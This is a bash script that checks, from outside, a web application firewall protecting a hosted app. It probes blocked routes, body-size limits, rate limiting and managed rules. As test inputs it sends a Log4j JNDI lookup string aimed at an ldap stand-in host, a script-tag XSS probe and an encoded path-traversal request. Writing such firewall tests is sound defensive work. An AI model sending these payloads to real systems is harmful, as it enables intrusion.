#!/usr/bin/env bash
# Checks the WAF from the outside (decision 49): what the public gets, or that an admin IP skips it.
#
#   infra/app/waf_check.sh                       # public view: run it from an IP NOT in waf_admin_ips
#   infra/app/waf_check.sh --admin               # from an admin IP: everything reaches the app
#   infra/app/waf_check.sh --rate                # also trips the 30/5 min limit on /v1/metrics/live
#                                                # (this IP then gets 429 there for up to ~5 minutes)
#   FUNCTION_URL=https://<id>.lambda-url.<region>.on.aws infra/app/waf_check.sh
#                                                # also checks the direct function URL answers 403
#
# Sends no chat message (no model spend). Bodies tell who answered: the WAF's own are
# blocked_route (404), request_too_large (413) and rate_limited (429); the AWS managed rules answer
# 403 with no JSON body; the app answers with its own JSON.
set -uo pipefail

APP_URL="${APP_URL:-https://d2k8cgrqduyk2o.cloudfront.net}"
MODE=public
RATE=0
for arg in "$@"; do
  case "$arg" in
    --admin) MODE=admin ;;
    --rate) RATE=1 ;;
    *) echo "unknown argument: $arg" >&2; exit 2 ;;
  esac
done

pass=0
fail=0
UA="waf-check/1.0"

# check <description> <expected status> <expected body substring or -> <curl args...>
check() {
  local what="$1" want="$2" body_want="$3"
  shift 3
  local out status body
  out=$(curl -s -o - -w $'\n%{http_code}' --max-time 20 "$@")
  status="${out##*$'\n'}"
  body="${out%$'\n'*}"
  if [[ "$status" == "$want" && ("$body_want" == "-" || "$body" == *"$body_want"*) ]]; then
    pass=$((pass + 1))
    printf '  ok    %-58s %s\n' "$what" "$status"
  else
    fail=$((fail + 1))
    printf '  FAIL  %-58s got %s, want %s %s\n' "$what" "$status" "$want" "$body_want"
    printf '        body: %.160s\n' "$body"
  fi
}

json=(-H "Content-Type: application/json" -A "$UA")

echo "== Pages and allowed API routes (both modes)"
for page in / /login /console /models; do
  check "GET $page" 200 - -A "$UA" "$APP_URL$page"
done
check "GET /health" 200 '"status":"ok"' -A "$UA" "$APP_URL/health"
check "GET /v1/metrics/live" 200 '"turns"' -A "$UA" "$APP_URL/v1/metrics/live"
check "GET /v1/demo/scenarios" 200 '"scenarios"' -A "$UA" "$APP_URL/v1/demo/scenarios"
# Allowed routes with an invalid body: the app's own validation error proves the WAF let them in.
check "POST /v1/auth/login (empty body -> app 422)" 422 '"detail"' "${json[@]}" -d '{}' "$APP_URL/v1/auth/login"
check "POST /v1/agent/cases (empty body -> app 422)" 422 '"detail"' "${json[@]}" -d '{}' "$APP_URL/v1/agent/cases"

if [[ "$MODE" == admin ]]; then
  echo "== Admin IP: the WAF lets everything through, the app answers"
  check "GET /v1/nonexistent (app 404, not blocked_route)" 404 '"Not Found"' -A "$UA" "$APP_URL/v1/nonexistent"
  check "GET /v1/chat/sessions (app 405)" 405 - -A "$UA" "$APP_URL/v1/chat/sessions"
else
  echo "== Refused at the edge: unknown routes and methods (404 blocked_route)"
  check "GET /v1/nonexistent" 404 blocked_route -A "$UA" "$APP_URL/v1/nonexistent"
  check "GET on a POST route" 404 blocked_route -A "$UA" "$APP_URL/v1/chat/sessions"
  check "POST on a GET route" 404 blocked_route "${json[@]}" -d '{}' "$APP_URL/health"
  check "OPTIONS /v1/chat/sessions" 404 blocked_route -X OPTIONS -A "$UA" "$APP_URL/v1/chat/sessions"
  check "DELETE /v1/agent/cases/NB-000000" 404 blocked_route -X DELETE -A "$UA" "$APP_URL/v1/agent/cases/NB-000000"
  check "PUT /v1/auth/login" 404 blocked_route -X PUT "${json[@]}" -d '{}' "$APP_URL/v1/auth/login"
  check "HEAD /health" 404 - -I -A "$UA" "$APP_URL/health"
  check "trailing slash /v1/metrics/live/" 404 blocked_route -A "$UA" "$APP_URL/v1/metrics/live/"
  check "encoded traversal in an id" 404 blocked_route -A "$UA" --path-as-is "$APP_URL/v1/demo/customers/%2e%2e%2f%2e%2e%2fetc"
  check "FastAPI docs /v1/docs" 404 blocked_route -A "$UA" "$APP_URL/v1/docs"
  check "unknown console action" 404 blocked_route "${json[@]}" -d '{}' "$APP_URL/v1/agent/cases/NB-000000/delete"

  echo "== Refused at the edge: body size (413) and managed rules (403)"
  big=$(head -c 20000 /dev/zero | tr '\0' 'a')
  check "POST body of 20 KB" 413 request_too_large "${json[@]}" -d "{\"text\":\"$big\"}" "$APP_URL/v1/auth/login"
  check "Log4j JNDI string in the body" 403 - "${json[@]}" -d '{"password":"${jndi:ldap://example.invalid/a}"}' "$APP_URL/v1/auth/login"
  check "Log4j JNDI string in the User-Agent" 403 - -A '${jndi:ldap://example.invalid/a}' "$APP_URL/v1/demo/scenarios"
  check "script tag in the body" 403 - "${json[@]}" -d '{"password":"<script>alert(1)</script>"}' "$APP_URL/v1/auth/login"
  check "no User-Agent header" 403 - -H 'User-Agent:' "$APP_URL/v1/demo/scenarios"
fi

if [[ -n "${FUNCTION_URL:-}" ]]; then
  echo "== Direct function URL (bypasses CloudFront): the app refuses without the secret"
  check "GET <function URL>/health" 403 '"forbidden"' -A "$UA" "${FUNCTION_URL%/}/health"
fi

if [[ "$RATE" == 1 && "$MODE" == public ]]; then
  echo "== Rate limit: 45 requests to /v1/metrics/live, then wait for 429 (WAF counts with a delay)"
  for _ in $(seq 45); do curl -s -o /dev/null -A "$UA" "$APP_URL/v1/metrics/live"; done
  got=""
  for _ in $(seq 24); do
    got=$(curl -s -o /dev/null -w '%{http_code}' -A "$UA" "$APP_URL/v1/metrics/live")
    [[ "$got" == 429 ]] && break
    sleep 5
    curl -s -o /dev/null -A "$UA" "$APP_URL/v1/metrics/live"
  done
  if [[ "$got" == 429 ]]; then
    pass=$((pass + 1)); echo "  ok    /v1/metrics/live answers 429 rate_limited after the burst"
  else
    fail=$((fail + 1)); echo "  FAIL  /v1/metrics/live never answered 429 within 2 minutes (last: $got)"
  fi
fi

echo
echo "$pass passed, $fail failed ($MODE view of $APP_URL)"
[[ "$fail" == 0 ]]
